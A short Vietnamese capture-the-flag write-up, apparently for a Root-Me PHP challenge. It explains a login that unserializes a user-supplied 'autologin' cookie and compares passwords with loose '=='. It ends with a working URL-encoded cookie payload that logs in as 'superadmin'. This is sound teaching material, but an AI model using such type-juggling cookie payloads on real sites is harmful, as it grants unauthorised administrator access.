Ở bài này công việc cốt yêu là đọc hiểu code và tìm được các điểm khả nghi.
Sau một hồi nghiên cứu thì logic của chức năng đăng nhập có thể tóm tắt như sau. Trường hợp một người dùng gửi username và password, khi đó các biến này sẽ được đem so sánh với các giá trị đã được cấu hình từ trước với password ở dạng hash sha256 và được lưu ở một file bí mật, trường hợp 2 là người dùng ko gửi username và password khi đó server sẽ kiểm tra cookie, biến cookie có tên autologin ở dạng serialized do người dùng gửi lên.
Dựa vào hint của challenge ta dễ dàng chú ý vào dòng code sau
```
	$data = unserialize($_COOKIE['autologin']); // Nếu còn thì chiết xuất ra mảng
    $autologin = "autologin";
    }
    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) { //Kiểm tra xem data
        $_SESSION['login'] = $data['login'];
    ...
    if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
    
```
Nhìn vào đoạn code trên dễ thấy 2 sơ hở
1. cookie được unserialize về mảng để authen
2. password được so sánh bởi dấu "=="

Khai thác vấn đề này, thấy ngày là chỉ cần thay đổi cookie sao cho password là một giá trị để phép so sánh luôn trả về True là ta có thể dễ dàng bypass qua phần login này
Payload:
```
Cookie:autologin=a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
```

Reference:
http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20POC2009%20Shocking%20News%20In%20PHP%20Exploitation.pdf